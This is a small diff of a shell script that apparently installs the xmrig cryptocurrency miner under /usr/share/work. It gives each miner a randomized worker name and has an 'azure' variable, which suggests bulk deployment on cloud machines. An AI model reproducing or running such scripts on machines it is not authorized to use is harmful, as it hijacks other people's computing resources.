@@ -2,7 +2,7 @@
 VERSION=4.6.2-beta
 azure=mxsemsdnlkdj
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
-apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget screen
+apt-get install -y git wget screen
 mkdir /usr/share
 mkdir /usr/share/work
 rm -r /usr/share/work/xmrig-$VERSION
